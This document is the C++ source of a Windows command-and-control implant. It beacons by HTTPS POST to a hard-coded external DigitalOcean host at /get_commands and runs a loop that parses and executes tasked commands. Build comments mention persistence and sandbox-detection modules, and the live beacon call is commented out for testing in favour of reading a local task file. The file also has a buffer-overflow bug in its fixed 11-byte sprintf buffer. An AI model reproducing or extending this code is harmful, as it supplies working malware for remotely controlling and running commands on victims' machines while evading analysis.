/**post request, try initial communcation with c2, when working->
every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->post to payload**/
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <iostream>
#include <windows.h>
#include <winhttp.h>
#include <future>
#include <cmath>
#include "nlohmann/json.hpp"
#include "parse/parse.h"
#include "execute/execute.h"

using json = nlohmann::json;

// current compile line is - g++ implant.cpp persist/persist.cpp parse/parse.cpp -lwinhttp -lbcrypt -static -o implant.exe 

// I think this is putting in the sandbox_detection
// g++ implant.cpp persist.cpp parse.cpp Feiyu/sandbox_detection.cpp -lwinhttp -lbcrypt -static -o implant.exe

#define SLEEP 60000


std::string makeHttpRequest(std::string fqdn, int port, std::string uri, int implant_id)
{
    // Used Windows documentation for every function
    int temp = 0;
    // LENGTH NEEDS TO BE SCALED DEPENDING ON OUR RANGE FOR IMPLANT_ID
    if (implant_id > 10)
    {
        temp = 2;
    }
    else
    {
        temp = 1;
    }
    int length = 7 + temp;
    char postdata[11];
    sprintf(postdata, "{\"id\":%d}", implant_id);

    LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";

    /* Converts from string to wstring to LPCWSTR
       https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
    */
    std::string result;
    std::wstring fqdn_wstring(fqdn.begin(), fqdn.end());
    LPCWSTR fqdnptr = fqdn_wstring.c_str();

    // The WinHttpOpen function initializes, for an application, the use of WinHTTP functions and returns a WinHTTP-session handle.
    HINTERNET hSession = WinHttpOpen(fqdnptr, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession)
    {
        return "WinHttpOpen Failed";
    }

    // The WinHttpConnect function specifies the initial target server of an HTTP request and returns an HINTERNET connection handle to an HTTP session for that initial target.
    HINTERNET hConnect = WinHttpConnect(hSession, fqdnptr, port, 0);

    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return "WinHttpConnect Failed";
    }

    // GET string for WinHttpOpenRequest
    std::string get = "POST";
    std::wstring get_wstring(get.begin(), get.end());
    LPCWSTR getptr = get_wstring.c_str();

    std::wstring get_uri(uri.begin(), uri.end());
    LPCWSTR uriptr = get_uri.c_str();

    // The WinHttpOpenRequest function creates an HTTP request handle.
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, getptr, uriptr, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    if (!hRequest)
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        return "WinHttpOpenRequest Failed";
    }
    // WinHttpAddRequestHeaders(hRequest, additionalHeaders, -1, WINHTTP_ADDREQ_FLAG_ADD);

    // The WinHttpSendRequest function sends the specified request to the HTTP server.
    if (!WinHttpSendRequest(hRequest, additionalHeaders, -1, postdata, length, length, 0))
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpSendRequest Failed";
    }

    if (!WinHttpReceiveResponse(hRequest, NULL))
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpReceiveResponse Failed";
    }

    DWORD lpdwNumberOfBytesAvailable = 0;
    LPSTR lpBuffer = NULL;

    do
    {

        lpdwNumberOfBytesAvailable = 0;

        if (!WinHttpQueryDataAvailable(hRequest, &lpdwNumberOfBytesAvailable))
        {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpQueryDataAvailable Failed";
        }

        // Initializing Buffer with 4096 bytes
        lpBuffer = new char[4096];
        ZeroMemory(lpBuffer, 4096);

        DWORD lpdwNumberOfBytesRead = 0;

        if (!WinHttpReadData(hRequest, lpBuffer, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead))
        {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpReadData Failed";
        }

        result = result + lpBuffer;
        delete[] lpBuffer;

    } while (lpdwNumberOfBytesAvailable > 0);

    WinHttpCloseHandle(hSession);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hRequest);
    return result;
}


std::string getTasks(int implant_id)
{
    std::string item = makeHttpRequest("sea-lion-app-f5nrq.ondigitalocean.app", 443, "/get_commands", implant_id);
    return item;
}


void runLoop(int implant_id)
{
    int jitter;
    while (true)
    {
        try
        {

            // WAS FOR TESTING PURPOSES - CHANGE LATER
            // std::string getting = getTasks(implant_id);
      
            // jitter = rand() * 10;
            // Sleep(SLEEP + jitter);
            // json commands = json::parse(getting);
            std::string jsonfile = "execute.json";
            // std::ofstream o(jsonfile);
            // o << commands << std::endl;
            // o.close();

            parseTasks(jsonfile);

            executecommandfromfile();
            

        }
        catch (const std::exception &e)
        {
            printf("\nError in runLoop: %s\n", e.what());
        }

        // SET SLEEP HERE
    }
}



int main(int argc, char *argv[])
{


    int implant_id=1;
    
    runLoop(implant_id);
    return 0;
}
